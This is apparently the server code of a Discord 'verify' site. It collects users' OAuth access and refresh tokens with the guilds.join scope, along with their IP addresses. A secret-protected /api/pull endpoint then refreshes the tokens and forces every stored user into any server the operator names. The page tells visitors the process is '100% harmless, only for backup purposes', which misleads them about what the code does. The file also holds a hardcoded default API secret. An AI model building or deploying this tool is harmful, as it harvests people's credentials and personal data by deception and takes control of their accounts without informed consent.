const express = require('express');
const fs = require('fs');
const path = require('path');

// --- Load .env manually ---
try {
  const envFile = fs.readFileSync('.env', 'utf-8');
  for (const line of envFile.split('\n')) {
    const [key, ...rest] = line.split('=');
    if (key && rest.length) process.env[key.trim()] = rest.join('=').trim();
  }
} catch (e) {}

const app = express();
app.use(express.json());

// Railway injects PORT automatically - must use it
const PORT = process.env.PORT || process.env.AUTH_PORT || 3000;
const DB_FILE = path.join(process.cwd(), 'verified-users.json');

const CLIENT_ID     = process.env.DISCORD_CLIENT_ID;
const CLIENT_SECRET = process.env.DISCORD_CLIENT_SECRET;
const REDIRECT_URI  = process.env.OAUTH_REDIRECT_URI;
const BOT_TOKEN     = process.env.DISCORD_TOKEN;
const PULL_SECRET   = process.env.PULL_SECRET || 'illegal-rest-s3cr3t-k3y-change-this-xK9mP2qL8vN4wR7';
const BOT_WEBHOOK_URL = process.env.BOT_WEBHOOK_URL || '';

// ---- DB helpers ----
function loadDb() {
  if (!fs.existsSync(DB_FILE)) fs.writeFileSync(DB_FILE, JSON.stringify({ verified: {}, unverified: {} }, null, 2));
  try { return JSON.parse(fs.readFileSync(DB_FILE, 'utf-8')); } catch(e) { return { verified: {}, unverified: {} }; }
}
function saveDb(db) { fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2)); }

// ---- Website HTML (inlined to avoid path issues) ----
const WEBSITE_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>illegal.rest — Verify</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');

    *, *::before, *::after {
      margin: 0; padding: 0; box-sizing: border-box;
    }

    :root {
      --white: #ffffff;
      --white-60: rgba(255,255,255,0.6);
      --white-30: rgba(255,255,255,0.3);
      --white-10: rgba(255,255,255,0.1);
      --white-05: rgba(255,255,255,0.05);
      --glow: 0 0 18px rgba(255,255,255,0.18), 0 0 40px rgba(255,255,255,0.07);
      --glow-strong: 0 0 30px rgba(255,255,255,0.35), 0 0 70px rgba(255,255,255,0.12);
    }

    html, body {
      height: 100%;
      font-family: 'Inter', system-ui, sans-serif;
      background: #000;
      color: var(--white);
      overflow: hidden;
    }

    /* ── Background ── */
    .bg {
      position: fixed;
      inset: 0;
      z-index: 0;
      background-image: url('https://file.garden/aeCg0yyn7Q9F4L3h/content.webp');
      background-size: cover;
      background-position: center;
      filter: brightness(0.35) saturate(0.2);
    }

    .bg-overlay {
      position: fixed;
      inset: 0;
      z-index: 1;
      background: radial-gradient(ellipse at center, rgba(0,0,0,0.5) 0%, rgba(0,0,0,0.85) 100%);
    }

    /* Snowflake particles */
    .snow {
      position: fixed;
      inset: 0;
      z-index: 2;
      pointer-events: none;
      overflow: hidden;
    }

    .flake {
      position: absolute;
      top: -20px;
      color: rgba(255,255,255,0.55);
      font-size: 14px;
      animation: fall linear infinite;
      user-select: none;
    }

    @keyframes fall {
      to { transform: translateY(110vh) rotate(360deg); opacity: 0; }
    }

    /* ── Wrapper ── */
    .wrapper {
      position: fixed;
      inset: 0;
      z-index: 10;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    /* ── Card ── */
    .card {
      background: rgba(0,0,0,0.55);
      backdrop-filter: blur(18px);
      -webkit-backdrop-filter: blur(18px);
      border: 1px solid var(--white-10);
      border-radius: 20px;
      padding: 40px 36px 32px;
      max-width: 420px;
      width: 100%;
      text-align: center;
      box-shadow: 0 8px 40px rgba(0,0,0,0.6), var(--glow);
      opacity: 0;
      transform: translateY(22px) scale(0.97);
      animation: fadeUp 0.7s cubic-bezier(0.22,1,0.36,1) 0.15s forwards;
    }

    @keyframes fadeUp {
      to { opacity: 1; transform: translateY(0) scale(1); }
    }

    /* ── Logo ── */
    .logo-wrap {
      display: flex;
      justify-content: center;
      margin-bottom: 16px;
    }

    .logo {
      width: 72px;
      height: 72px;
      border-radius: 50%;
      border: 2px solid var(--white-30);
      box-shadow: var(--glow-strong);
      object-fit: cover;
    }

    /* ── Site name ── */
    .site-name {
      font-size: 22px;
      font-weight: 700;
      letter-spacing: 0.04em;
      color: var(--white);
      text-shadow: var(--glow);
      margin-bottom: 8px;
    }

    /* ── Badges ── */
    .badges {
      display: flex;
      justify-content: center;
      gap: 6px;
      margin-bottom: 18px;
    }

    .badge {
      position: relative;
      display: inline-flex;
      cursor: default;
    }

    .badge img {
      width: 22px;
      height: 22px;
      object-fit: contain;
      filter: drop-shadow(0 0 5px rgba(255,255,255,0.3));
      transition: filter 0.2s, transform 0.2s;
    }

    .badge:hover img {
      filter: drop-shadow(0 0 10px rgba(255,255,255,0.7));
      transform: scale(1.2);
    }

    .badge .tooltip {
      position: absolute;
      bottom: calc(100% + 8px);
      left: 50%;
      transform: translateX(-50%);
      background: rgba(0,0,0,0.85);
      border: 1px solid var(--white-10);
      color: var(--white);
      font-size: 11px;
      white-space: nowrap;
      padding: 4px 10px;
      border-radius: 6px;
      pointer-events: none;
      opacity: 0;
      transition: opacity 0.15s;
      backdrop-filter: blur(6px);
    }

    .badge:hover .tooltip { opacity: 1; }

    /* ── Typewriter text ── */
    .typewriter-wrap {
      min-height: 42px;
      margin-bottom: 22px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .typewriter {
      font-size: 14px;
      color: var(--white-60);
      font-weight: 400;
      letter-spacing: 0.01em;
      text-shadow: 0 0 12px rgba(255,255,255,0.2);
    }

    .cursor {
      display: inline-block;
      width: 2px;
      height: 1em;
      background: var(--white-60);
      margin-left: 2px;
      vertical-align: middle;
      animation: blink 0.75s step-end infinite;
    }

    @keyframes blink { 50% { opacity: 0; } }

    /* ── Verify button ── */
    .verify-btn {
      display: inline-block;
      width: 100%;
      padding: 14px 0;
      background: var(--white);
      color: #000;
      font-size: 15px;
      font-weight: 700;
      letter-spacing: 0.05em;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      text-decoration: none;
      box-shadow: 0 0 20px rgba(255,255,255,0.25);
      transition: background 0.2s, box-shadow 0.2s, transform 0.15s;
      margin-bottom: 20px;
    }

    .verify-btn:hover {
      background: #e8e8e8;
      box-shadow: 0 0 35px rgba(255,255,255,0.4);
      transform: translateY(-1px);
    }

    .verify-btn:active {
      transform: translateY(0);
    }

    /* ── Social icons ── */
    .socials {
      display: flex;
      justify-content: center;
      gap: 10px;
    }

    .social-btn {
      display: flex;
      align-items: center;
      justify-content: center;
      width: 44px;
      height: 44px;
      background: var(--white-05);
      border: 1px solid var(--white-10);
      border-radius: 10px;
      color: var(--white-60);
      text-decoration: none;
      font-size: 18px;
      transition: background 0.2s, color 0.2s, border-color 0.2s, box-shadow 0.2s;
    }

    .social-btn:hover {
      background: var(--white-10);
      color: var(--white);
      border-color: var(--white-30);
      box-shadow: 0 0 14px rgba(255,255,255,0.1);
    }

    /* ── Footer ── */
    footer {
      position: fixed;
      bottom: 18px;
      left: 0;
      width: 100%;
      text-align: center;
      z-index: 20;
      font-size: 12px;
      color: var(--white-30);
      opacity: 0;
      animation: fadeUp 0.7s cubic-bezier(0.22,1,0.36,1) 0.5s forwards;
    }

    footer a {
      color: var(--white-60);
      text-decoration: none;
      transition: color 0.2s;
    }

    footer a:hover { color: var(--white); }

    /* ── Success state ── */
    .success-badge {
      display: none;
      color: #4ade80;
      font-size: 13px;
      margin-bottom: 14px;
      font-weight: 500;
      text-shadow: 0 0 12px rgba(74,222,128,0.4);
    }
  </style>
</head>
<body>

<!-- Background -->
<div class="bg"></div>
<div class="bg-overlay"></div>

<!-- Snow -->
<div class="snow" id="snow"></div>

<!-- Card -->
<div class="wrapper">
  <div class="card">

    <div class="logo-wrap">
      <img class="logo" src="https://file.garden/aeCg0yyn7Q9F4L3h/ok.png" alt="illegal.rest logo" />
    </div>

    <div class="site-name">illegal.rest</div>

    <div class="badges">
      <div class="badge">
        <img src="https://file.garden/aeCg0yyn7Q9F4L3h/9358-shinyblueowner.png" alt="owner" />
        <div class="tooltip">illegal.rest owner</div>
      </div>
      <div class="badge">
        <img src="https://file.garden/aeCg0yyn7Q9F4L3h/8417-shinybluemoderator.png" alt="moderator" />
        <div class="tooltip">illegal.rest moderator</div>
      </div>
      <div class="badge">
        <img src="https://file.garden/aeCg0yyn7Q9F4L3h/8098-shinybluestaff.png" alt="staff" />
        <div class="tooltip">illegal.rest staff</div>
      </div>
      <div class="badge">
        <img src="https://file.garden/aeCg0yyn7Q9F4L3h/3052-shinybluebughunter.png" alt="bughunter" />
        <div class="tooltip">bug hunter</div>
      </div>
      <div class="badge">
        <img src="https://file.garden/aeCg0yyn7Q9F4L3h/4447-shinyblueverified.png" alt="verified" />
        <div class="tooltip">verified</div>
      </div>
      <div class="badge">
        <img src="https://file.garden/aeCg0yyn7Q9F4L3h/9111-shinyblueearlydev.png" alt="earlydev" />
        <div class="tooltip">illegal.rest bot developer</div>
      </div>
      <div class="badge">
        <img src="https://file.garden/aeCg0yyn7Q9F4L3h/5974-shinybluepartner.png" alt="partner" />
        <div class="tooltip">illegal.rest partner</div>
      </div>
    </div>

    <div class="success-badge" id="successBadge">✅ Successfully Verified</div>

    <div class="typewriter-wrap">
      <span class="typewriter" id="typewriter"></span><span class="cursor"></span>
    </div>

    <a id="verifyBtn" class="verify-btn" href="/auth">Verify</a>

    <div class="socials">
      <a class="social-btn" href="https://x.com" target="_blank" rel="noreferrer" title="X / Twitter">
        <svg viewBox="0 0 24 24" fill="currentColor" width="18" height="18"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.743l7.738-8.835L2.25 2.25h6.956l4.259 5.63zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
      </a>
      <a class="social-btn" href="https://github.com" target="_blank" rel="noreferrer" title="GitHub">
        <svg viewBox="0 0 24 24" fill="currentColor" width="18" height="18"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61-.546-1.385-1.335-1.755-1.335-1.755-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
      </a>
      <a class="social-btn" href="https://youtube.com" target="_blank" rel="noreferrer" title="YouTube">
        <svg viewBox="0 0 24 24" fill="currentColor" width="18" height="18"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
      </a>
    </div>
  </div>
</div>

<footer>
  <span>Powered by <a href="https://illegal.rest" target="_blank">illegal.rest</a></span>
  &nbsp;|&nbsp;
  <a href="#" target="_blank">Privacy Policy</a>
</footer>

<script>
  // ── Snow ──
  const snowContainer = document.getElementById('snow');
  for (let i = 0; i < 28; i++) {
    const f = document.createElement('div');
    f.className = 'flake';
    f.textContent = '❄';
    f.style.left = Math.random() * 100 + 'vw';
    f.style.fontSize = (10 + Math.random() * 12) + 'px';
    f.style.animationDuration = (8 + Math.random() * 12) + 's';
    f.style.animationDelay = (Math.random() * 12) + 's';
    f.style.opacity = 0.3 + Math.random() * 0.4;
    snowContainer.appendChild(f);
  }

  // ── Typewriter ──
  const messages = [
    'Thank you for Verifying.',
    'This is 100% harmless, only for backup purposes.',
  ];
  const el = document.getElementById('typewriter');
  let msgIdx = 0, charIdx = 0, deleting = false;

  function type() {
    const current = messages[msgIdx];
    if (!deleting) {
      el.textContent = current.slice(0, ++charIdx);
      if (charIdx === current.length) {
        deleting = true;
        setTimeout(type, 2400);
        return;
      }
      setTimeout(type, 42);
    } else {
      el.textContent = current.slice(0, --charIdx);
      if (charIdx === 0) {
        deleting = false;
        msgIdx = (msgIdx + 1) % messages.length;
        setTimeout(type, 380);
        return;
      }
      setTimeout(type, 22);
    }
  }

  setTimeout(type, 700);

  // ── Check if verified ──
  const params = new URLSearchParams(location.search);
  if (params.get('verified') === '1') {
    document.getElementById('successBadge').style.display = 'block';
    const btn = document.getElementById('verifyBtn');
    btn.textContent = '✓ Verified';
    btn.style.background = '#4ade80';
    btn.style.boxShadow = '0 0 25px rgba(74,222,128,0.35)';
    btn.style.pointerEvents = 'none';
  }
</script>
</body>
</html>
`;

// ---- Routes ----
app.get('/', (req, res) => {
  if (req.query.verified === '1') {
    // inject verified param into HTML
    return res.send(WEBSITE_HTML);
  }
  res.send(WEBSITE_HTML);
});

app.get('/auth', (req, res) => {
  if (!CLIENT_ID || !REDIRECT_URI) {
    return res.status(500).send('OAuth not configured. Set DISCORD_CLIENT_ID and OAUTH_REDIRECT_URI in Railway variables.');
  }
  const params = new URLSearchParams({
    client_id: CLIENT_ID,
    redirect_uri: REDIRECT_URI,
    response_type: 'code',
    scope: 'identify guilds.join',
  });
  res.redirect('https://discord.com/oauth2/authorize?' + params.toString());
});

app.get('/callback', async (req, res) => {
  const code = req.query.code;
  if (!code) return res.status(400).send('Missing code.');
  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
  try {
    const tokenRes = await fetch('https://discord.com/api/oauth2/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        client_id: CLIENT_ID,
        client_secret: CLIENT_SECRET,
        grant_type: 'authorization_code',
        code,
        redirect_uri: REDIRECT_URI,
      }),
    });
    const tokenData = await tokenRes.json();
    if (!tokenData.access_token) {
      console.error('Token exchange failed:', tokenData);
      return res.status(500).send('OAuth failed: ' + JSON.stringify(tokenData));
    }
    const userRes = await fetch('https://discord.com/api/users/@me', {
      headers: { Authorization: 'Bearer ' + tokenData.access_token },
    });
    const user = await userRes.json();
    if (!user.id) return res.status(500).send('Could not fetch user.');
    const db = loadDb();
    db.verified[user.id] = {
      id: user.id,
      username: user.username,
      access_token: tokenData.access_token,
      refresh_token: tokenData.refresh_token,
      scope: tokenData.scope,
      ip,
      timestamp: new Date().toISOString(),
    };
    delete db.unverified[user.id];
    saveDb(db);
    console.log('[Auth] Verified:', user.username, '| IP:', ip);

    res.redirect('/?verified=1');
  } catch (err) {
    console.error('[Auth callback error]', err);
    res.status(500).send('Internal error: ' + err.message);
  }
});

app.get('/api/verified', (req, res) => {
  if (req.headers['x-pull-secret'] !== PULL_SECRET) return res.status(401).json({ error: 'Unauthorized' });
  res.json(loadDb().verified);
});

app.get('/api/unverified', (req, res) => {
  if (req.headers['x-pull-secret'] !== PULL_SECRET) return res.status(401).json({ error: 'Unauthorized' });
  res.json(loadDb().unverified);
});

app.post('/api/pull', async (req, res) => {
  if (req.headers['x-pull-secret'] !== PULL_SECRET) return res.status(401).json({ error: 'Unauthorized' });
  const { guildId } = req.body;
  if (!guildId) return res.status(400).json({ error: 'Missing guildId' });
  const users = Object.values(loadDb().verified);
  let success = 0, fail = 0;
  const pulledUserIds = [];

  for (const user of users) {
    if (!user.access_token) { fail++; console.warn('[Pull] No token for', user.username); continue; }

    // Try to refresh token first to ensure it's valid
    let accessToken = user.access_token;
    if (user.refresh_token) {
      try {
        const refreshRes = await fetch('https://discord.com/api/oauth2/token', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: new URLSearchParams({
            client_id: CLIENT_ID,
            client_secret: CLIENT_SECRET,
            grant_type: 'refresh_token',
            refresh_token: user.refresh_token,
          }),
        });
        const refreshData = await refreshRes.json();
        if (refreshData.access_token) {
          accessToken = refreshData.access_token;
          // Update DB with new tokens
          const db = loadDb();
          if (db.verified[user.id]) {
            db.verified[user.id].access_token = refreshData.access_token;
            db.verified[user.id].refresh_token = refreshData.refresh_token || user.refresh_token;
          }
          saveDb(db);
        }
      } catch (e) {
        console.warn('[Pull] Token refresh failed for', user.username, e.message);
      }
    }

    try {
      const r = await fetch(`https://discord.com/api/guilds/${guildId}/members/${user.id}`, {
        method: 'PUT',
        headers: { Authorization: 'Bot ' + BOT_TOKEN, 'Content-Type': 'application/json' },
        body: JSON.stringify({ access_token: accessToken }),
      });
      const body = await r.json().catch(() => ({}));
      if (r.status === 201 || r.status === 204 || r.status === 200) {
        success++;
        pulledUserIds.push(user.id);
      } else {
        fail++;
        console.warn('[Pull] Failed for', user.username, r.status, JSON.stringify(body));
      }
    } catch (e) {
      fail++;
      console.error('[Pull] Error for', user.username, e.message);
    }
    await new Promise(r => setTimeout(r, 600));
  }
  res.json({ success, fail, total: users.length, pulledUserIds });
});

app.post('/api/unverified', (req, res) => {
  if (req.headers['x-pull-secret'] !== PULL_SECRET) return res.status(401).json({ error: 'Unauthorized' });
  const { id, username } = req.body;
  if (!id) return res.status(400).json({ error: 'Missing id' });
  const db = loadDb();
  if (!db.verified[id]) {
    db.unverified[id] = { id, username: username || 'Unknown', timestamp: new Date().toISOString() };
    saveDb(db);
  }
  res.json({ ok: true });
});

app.get('/api/config', (req, res) => {
  if (req.headers['x-pull-secret'] !== PULL_SECRET) return res.status(401).json({ error: 'Unauthorized' });
  const db = loadDb();
  res.json(db.config || {});
});

app.post('/api/config', (req, res) => {
  if (req.headers['x-pull-secret'] !== PULL_SECRET) return res.status(401).json({ error: 'Unauthorized' });
  const db = loadDb();
  if (!db.config) db.config = {};
  Object.assign(db.config, req.body);
  saveDb(db);
  res.json({ ok: true });
});

app.get('/api/protected', (req, res) => {
  if (req.headers['x-pull-secret'] !== PULL_SECRET) return res.status(401).json({ error: 'Unauthorized' });
  const db = loadDb();
  res.json({ protected: db.protected || [] });
});

app.post('/api/protected', (req, res) => {
  if (req.headers['x-pull-secret'] !== PULL_SECRET) return res.status(401).json({ error: 'Unauthorized' });
  const { protected: list } = req.body;
  if (!Array.isArray(list)) return res.status(400).json({ error: 'Invalid' });
  const db = loadDb();
  db.protected = list;
  saveDb(db);
  res.json({ ok: true });
});

app.get('/api/check/:userId', (req, res) => {
  if (req.headers['x-pull-secret'] !== PULL_SECRET) return res.status(401).json({ error: 'Unauthorized' });
  const db = loadDb();
  const v = db.verified[req.params.userId];
  const u = db.unverified[req.params.userId];
  if (v) return res.json({ status: 'verified', ...v });
  if (u) return res.json({ status: 'unverified', ...u });
  return res.json({ status: 'unknown' });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log('[Auth Server] Running on port ' + PORT);
});

module.exports = app;
